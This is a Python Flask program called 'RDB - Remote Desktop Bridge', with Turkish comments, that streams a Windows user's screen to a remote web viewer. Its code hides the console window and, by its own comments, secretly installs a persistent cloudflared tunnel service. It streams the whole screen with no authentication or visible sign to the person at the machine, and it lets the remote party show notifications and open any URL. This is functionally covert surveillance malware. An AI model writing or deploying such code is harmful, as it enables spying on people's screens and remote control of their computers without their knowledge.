import os
import io
import time
import subprocess
import threading
import webbrowser
import logging
import ctypes
from flask import Flask, Response, render_template_string, request

# Modern Kütüphaneler (pip install flask mss pillow requests)
import mss
from PIL import Image, ImageEnhance

# ================= GİZLİLİK VE AYARLAR =================
kernel32 = ctypes.WinDLL('kernel32')
user32 = ctypes.WinDLL('user32')
hWnd = kernel32.GetConsoleWindow()
if hWnd:
    user32.ShowWindow(hWnd, 0)
    
CREATE_NO_WINDOW = 0x08000000
CF_TOKEN = "YOUR_TOKEN"
# =======================================================

app = Flask(__name__)
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

def setup_cloudflared():
    """Cloudflared servisini gizlice kurar ve rdb.verify ile kilitler"""
    # Uygulamanın çalıştığı dizini bul (exe'ye dönüştürülse bile doğru klasörü bulur)
    base_dir = os.path.dirname(os.path.abspath(__file__))
    verify_file = os.path.join(base_dir, "rdb.verify")
    cf_exe = os.path.join(base_dir, "cloudflared.exe")

    # Eğer verify dosyası yoksa, kurulum yap
    if not os.path.exists(verify_file):
        if os.path.exists(cf_exe):
            try:
                # 1. Her ihtimale karşı eski servisi arkaplanda temizle
                subprocess.run([cf_exe, "service", "uninstall"], creationflags=CREATE_NO_WINDOW, capture_output=True)
                
                # 2. Yeni token ile servisi gizlice kur
                subprocess.run([cf_exe, "service", "install", CF_TOKEN], creationflags=CREATE_NO_WINDOW, capture_output=True)
                
                # 3. Servisi başlat (Windows servis yöneticisi üzerinden)
                subprocess.run(["sc", "start", "cloudflared"], creationflags=CREATE_NO_WINDOW, capture_output=True)
                
                # 4. Kurulum başarılı olduysa kilit (verify) dosyasını oluştur
                with open(verify_file, "w") as f:
                    f.write("installation verified.")
            except Exception as e:
                pass

def send_windows_notification(title, message):
    """3.14 Uyumlu Modern Bildirim Sistemi - PowerShell Tırnak Hatası Giderildi"""
    safe_title = title.replace('"', "'")
    safe_msg = message.replace('"', "'")
    ps_cmd = f'[reflection.assembly]::loadwithpartialname("System.Windows.Forms"); $obj = New-Object Windows.Forms.NotifyIcon; $obj.Icon = [System.Drawing.SystemIcons]::Information; $obj.BalloonTipTitle = "{safe_title}"; $obj.BalloonTipText = "{safe_msg}"; $obj.Visible = $True; $obj.ShowBalloonTip(5000);'
    subprocess.run(["powershell", "-Command", ps_cmd], capture_output=True, creationflags=CREATE_NO_WINDOW)

def create_kill_switch():
    """Sadece Python'u kapatacak şekilde optimize edildi"""
    user_dir = os.path.expanduser("~")
    bat_path = os.path.join(user_dir, "rdb.bat")
    bat_content = """@echo off\nif /I "%1"=="close" (\n    taskkill /f /im python.exe /t >nul 2>&1\n    del "%~f0"\n)"""
    try:
        with open(bat_path, "w", encoding="utf-8") as f:
            f.write(bat_content)
    except: pass

# --- ELITE TÜRKÇE UI: FULL HAREKETLİ IZGARA ---
HTML_UI = """
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RDB - By Fıstıkcan</title>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;500;800&family=JetBrains+Mono&display=swap" rel="stylesheet">
    <style>
        :root { 
            --primary: #93c90f; 
            --bg: #020202; 
            --panel: rgba(15, 15, 15, 0.75); 
        }
        
        * { box-sizing: border-box; margin: 0; padding: 0; }
        
        body { 
            background: var(--bg); color: #fff; font-family: 'Inter', sans-serif; 
            height: 100vh; overflow: hidden; display: flex; align-items: center; justify-content: center;
        }

        .grid-bg {
            position: fixed; top: -50%; left: -50%; width: 200%; height: 200%;
            background-image: 
                linear-gradient(to right, rgba(147, 201, 15, 0.08) 1px, transparent 1px),
                linear-gradient(to bottom, rgba(147, 201, 15, 0.08) 1px, transparent 1px);
            background-size: 60px 60px;
            z-index: -1;
            animation: diagonalMove 20s linear infinite;
        }
        @keyframes diagonalMove {
            0% { transform: translate(0, 0); }
            100% { transform: translate(60px, 60px); }
        }

        #loader-wrapper {
            position: fixed; inset: 0; background: #000; z-index: 9999;
            display: flex; flex-direction: column; align-items: center; justify-content: center;
        }
        .loader-circle {
            width: 80px; height: 80px; border: 2px solid rgba(147, 201, 15, 0.1);
            border-top: 2px solid var(--primary); border-radius: 50%;
            animation: spin 1.2s cubic-bezier(0.5, 0, 0.5, 1) infinite;
        }
        @keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }

        #main-content { 
            display: none; width: 100%; height: 100vh; padding: 40px; gap: 40px;
            background: transparent; 
        }

        .screen-container { 
            flex: 3; position: relative; border-radius: 24px; 
            background: #000; overflow: hidden; border: 1px solid rgba(147, 201, 15, 0.2);
            box-shadow: 0 20px 50px rgba(0,0,0,0.8);
        }
        #stream { width: 100%; height: 100%; object-fit: contain; }

        .side-panel { flex: 1; display: flex; flex-direction: column; gap: 20px; }

        .menu-item {
            background: var(--panel); border-radius: 20px; padding: 30px;
            border: 1px solid rgba(147, 201, 15, 0.15); backdrop-filter: blur(15px);
            opacity: 0; transform: translateX(50px);
        }

        .animate-in { animation: slideIn 0.8s cubic-bezier(0.16, 1, 0.3, 1) forwards; }
        @keyframes slideIn { to { opacity: 1; transform: translateX(0); } }

        .header h1 { font-size: 48px; font-weight: 800; color: var(--primary); letter-spacing: -2px; }
        .header p { font-size: 12px; color: #888; text-transform: uppercase; letter-spacing: 2px; }

        input[type="text"] { 
            width: 100%; background: rgba(0,0,0,0.5); border: 1px solid rgba(255,255,255,0.1);
            color: #fff; padding: 15px; border-radius: 12px; outline: none; margin-top: 15px;
        }
        input:focus { border-color: var(--primary); }

        button { 
            width: 100%; background: var(--primary); color: #000; border: none; padding: 15px; 
            border-radius: 12px; font-weight: 600; cursor: pointer; margin-top: 10px;
            transition: 0.3s;
        }
        button:hover { transform: translateY(-3px); box-shadow: 0 10px 20px rgba(147, 201, 15, 0.3); }

        .status-tag {
            position: absolute; top: 20px; left: 20px; background: rgba(0,0,0,0.6);
            padding: 6px 12px; border-radius: 8px; font-size: 10px; font-weight: 600;
            color: var(--primary); border: 1px solid var(--primary); z-index: 10;
        }
    </style>
</head>
<body>

<div class="grid-bg"></div>

<div id="loader-wrapper">
    <div class="loader-circle"></div>
    <div style="margin-top:20px; color:var(--primary); letter-spacing:4px; font-size:10px;">SİSTEM YÜKLENİYOR</div>
</div>

<div id="main-content">
    <div class="screen-container">
        <div class="status-tag">CANLI</div>
        <img id="stream" src="/video_feed">
    </div>
    
    <div class="side-panel">
        <div class="menu-item header animate-in" style="animation-delay: 0.1s;">
            <h1>RDB</h1>
            <p>REMOTE DESKTOP BRIDGE</p>
        </div>

        <div class="menu-item animate-in" style="animation-delay: 0.2s;">
            <h3 style="font-size: 12px; color: var(--primary); text-transform: uppercase;">Mesaj Gönder</h3>
            <input type="text" id="msg-in" placeholder="Mesajınızı buraya yazın...">
            <button onclick="send('notify')">MESAJI GÖNDER</button>
        </div>
        
        <div class="menu-item animate-in" style="animation-delay: 0.3s;">
            <h3 style="font-size: 12px; color: var(--primary); text-transform: uppercase;">İnternet Adresi Aç</h3>
            <input type="text" id="url-in" placeholder="https://github.com/Fistikcan...">
            <button onclick="send('open')">ADRESİ AÇ</button>
        </div>

        <div class="menu-item animate-in" style="animation-delay: 0.4s; margin-top: auto; text-align: center;">
            <p style="font-size: 9px; color: #555; letter-spacing: 2px;">Product of Fıstıkcan</p>
        </div>
    </div>
</div>

<script>
    const loadTime = Math.floor(Math.random() * 5000) + 5000;
    setTimeout(() => {
        document.getElementById('loader-wrapper').style.opacity = '0';
        setTimeout(() => {
            document.getElementById('loader-wrapper').style.display = 'none';
            document.getElementById('main-content').style.display = 'flex';
        }, 500);
    }, loadTime);

    function send(type) {
        let inputId = type === 'notify' ? 'msg-in' : 'url-in';
        let val = document.getElementById(inputId).value;
        if(!val) return;
        fetch(`/${type}?data=${encodeURIComponent(val)}`);
        document.getElementById(inputId).value = "";
    }
</script>
</body>
</html>
"""

# --- BACKEND (3.14 UYUMLU) ---
def capture_screen():
    with mss.mss() as sct:
        monitor = sct.monitors[1]
        while True:
            start = time.time()
            img = sct.grab(monitor)
            img_pil = Image.frombytes("RGB", img.size, img.bgra, "raw", "BGRX")
            
            # Görüntü İyileştirme
            img_pil = ImageEnhance.Color(img_pil).enhance(1.1)      
            img_pil = ImageEnhance.Contrast(img_pil).enhance(1.0)   
            img_pil = img_pil.resize((1280, 720)) 
            
            output = io.BytesIO()
            img_pil.save(output, format='JPEG', quality=60) 
            frame = output.getvalue()
            
            yield (b'--frame\r\n'
                   b'Content-Type: image/jpeg\r\n\r\n' + frame + b'\r\n')
            
            # FPS'i tam 2 FPS yapmak için 0.5 saniye bekleme
            time.sleep(0.5)

@app.route('/')
def home(): 
    return render_template_string(HTML_UI)

@app.route('/video_feed')
def video_feed(): 
    return Response(capture_screen(), mimetype='multipart/x-mixed-replace; boundary=frame')

@app.route('/notify')
def send_notify():
    msg = request.args.get('data', 'RDB Bildirim')
    threading.Thread(target=lambda: send_windows_notification("RDB Mesaj", msg)).start()
    return "OK"

@app.route('/open')
def open_url():
    url = request.args.get('data')
    if url:
        if not url.startswith("http"): url = "https://" + url
        webbrowser.open(url)
    return "OK"

if __name__ == '__main__':
    create_kill_switch()
    # İlk açılışta Cloudflare tünelini kontrol edip kuran parçacığı başlatıyoruz
    threading.Thread(target=setup_cloudflared, daemon=True).start()
    
    app.run(host='0.0.0.0', port=5000, threaded=True, debug=False, use_reloader=False)
